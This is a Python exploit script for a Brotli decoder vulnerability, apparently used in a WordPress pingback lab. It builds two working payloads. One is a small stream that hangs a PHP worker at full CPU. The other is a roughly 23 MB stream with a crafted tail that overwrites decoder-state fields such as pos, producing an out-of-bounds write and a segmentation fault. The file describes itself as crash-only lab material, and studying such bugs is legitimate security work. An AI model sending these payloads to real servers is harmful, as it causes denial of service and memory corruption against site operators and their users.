#!/usr/bin/env python3
"""Brotli payloads for the CVE-2026-111497 WordPress pingback lab.

Two crash-only payloads:

* ``build_hang_payload()`` -- 86 bytes.  A non-progressing decode loop that
  pins a PHP worker at 100% CPU.  The 22-byte seed comes from Node.js'
  regression test (test/parallel/test-zlib-invalid-input.js).
* ``build_crash_payload()`` -- ~23 MB.  A 16 MiB metablock with 2^24
  zero-output dictionary commands, followed by 3 padding bytes and a
  127-byte tail.  The tail corrupts ``BrotliDecoderState.pos`` and makes the
  ring-buffer copy write about 1 GiB outside the buffer: SIGSEGV.

The stream layout follows the public analysis of CVE-2026-111497
(google/brotli@0ed4268a, Node.js, TheFool-TAROT, dimasma0305).  The crash
tail is deliberately ours: it sets ``pos`` to a wild value instead of a
heap-groomed offset.  There is no RCE payload here.
"""

from __future__ import annotations

import struct

HANG_SEED = bytes.fromhex("200010414141fcffff07002228f00b60f7f41f000000")
HANG_PAD = b"\x00" * 64
CRASH_STREAM_SIZE = 23_068_690
CRASH_TAIL_SIZE = 127


class BitWriter:
    """LSB-first bit writer for the Brotli bit stream."""

    def __init__(self) -> None:
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value: int, count: int) -> None:
        for bit in range(count):
            self.value |= ((value >> bit) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def align(self, blob: bytes) -> None:
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(blob)

    def finish(self) -> bytes:
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def one_symbol_tree(bits: BitWriter, alphabet_size: int, symbol: int) -> None:
    """Simple Huffman tree with a single symbol."""
    bits.put(1, 2)  # simple tree
    bits.put(0, 2)  # one symbol
    bits.put(symbol, (alphabet_size - 1).bit_length())


def varlen_u8(bits: BitWriter, value: int) -> None:
    """Brotli's variable-length uint8 encoding."""
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def build_stream() -> bytes:
    """Build the 16 MiB / 2^24-command trigger metablock."""
    bits = BitWriter()

    # WBITS = 10: 1 KiB ring buffer.
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)

    # Compressed metablock: MLEN + 1 = 2^24.
    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)

    varlen_u8(bits, 0)  # one literal block type
    varlen_u8(bits, 1)  # two command block types
    one_symbol_tree(bits, 4, 0)
    one_symbol_tree(bits, 26, 25)
    bits.put(0xFFFFFF, 24)  # command block length > 2^24
    varlen_u8(bits, 0)  # one distance block type
    bits.put(3, 6)  # NPOSTFIX=3, NDIRECT=0
    bits.put(0, 2)  # literal context mode
    varlen_u8(bits, 0)  # one literal context tree
    varlen_u8(bits, 0)  # one distance context tree

    one_symbol_tree(bits, 256, 0)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 400, 184)

    # 2^24 commands, 11 bits each.  They select dictionary transform
    # OMIT_LAST_7 and produce zero output while decrementing the distance
    # block length.
    distance_extra = 4
    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1

    group = BitWriter()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.align(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)

    stream = bits.finish()
    if len(stream) != CRASH_STREAM_SIZE:
        raise AssertionError(f"unexpected stream length: {len(stream)}")
    return stream


def build_hang_payload() -> bytes:
    """86-byte non-progressing decoder loop."""
    return HANG_SEED + HANG_PAD


def build_crash_tail() -> bytes:
    """127-byte tail that corrupts BrotliDecoderState and causes SIGSEGV.

    x86-64 Brotli 1.1.0/1.2.0 layout:

        tail[7]      -> state + 80  buffer_length
        tail[15..18] -> state + 88  pos
        tail[19..22] -> state + 92  max_backward_distance
        tail[23..26] -> state + 96  max_distance

    ``pos = -1 GiB`` makes the ring memmove16 fault on an unmapped address.
    """
    tail = bytearray(CRASH_TAIL_SIZE)
    tail[7] = 8
    struct.pack_into("<i", tail, 15, -0x40000000)
    struct.pack_into("<I", tail, 19, 0x7FFFFFFF)
    struct.pack_into("<I", tail, 23, 0x7FFFFFFF)
    return bytes(tail)


def build_crash_payload() -> bytes:
    """23 MB trigger: stream + 3 pad bytes + crash tail."""
    return build_stream() + b"\x00" * 3 + build_crash_tail()
